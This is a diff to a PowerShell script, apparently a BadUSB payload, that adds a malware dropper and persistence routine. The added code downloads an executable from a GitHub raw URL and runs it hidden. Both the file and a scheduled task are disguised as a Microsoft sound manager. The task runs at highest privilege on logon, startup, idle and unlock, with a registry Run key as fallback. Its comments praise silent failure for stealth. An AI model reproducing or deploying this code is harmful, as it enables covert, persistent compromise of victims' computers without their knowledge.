@@ -34,6 +34,42 @@ try {
 } catch {
     # Silent fail — useful for stealthy environments
 }
+# Main EXE for persistence
+$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/MicrosoftSoundManager.exe"
+$mainExePath = "$env:APPDATA\MicrosoftSoundManager.exe"
+$taskName = "Windows Sound Manager"
+
+try {
+    # 1. Download WinUman.exe if it doesn't already exist
+    if (-not (Test-Path $mainExePath)) {
+        Invoke-WebRequest -Uri $mainExeUrl -OutFile $mainExePath -UseBasicParsing
+    }
+
+    # 2. Start the EXE silently
+    Start-Process -FilePath $mainExePath -WindowStyle Hidden
+
+    # 3. Define full multi-trigger persistence
+    $action = New-ScheduledTaskAction -Execute $mainExePath
+    $triggers = @(
+        New-ScheduledTaskTrigger -AtLogOn,
+        New-ScheduledTaskTrigger -AtStartup,
+        New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1),
+        New-ScheduledTaskTrigger -AtWorkStationUnlock,
+        New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
+    )
+    $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)
+
+    # 4. Register only if not already created
+    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
+    }
+
+    # 5. Registry fallback in case Scheduled Tasks are disabled
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftSoundManager" -Value $mainExePath
+
+} catch {
+    # Silent fail — useful for stealthy environments
+}
 try {
     $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     $shortcutPath = Join-Path $startupPath "System Update Manager.lnk"
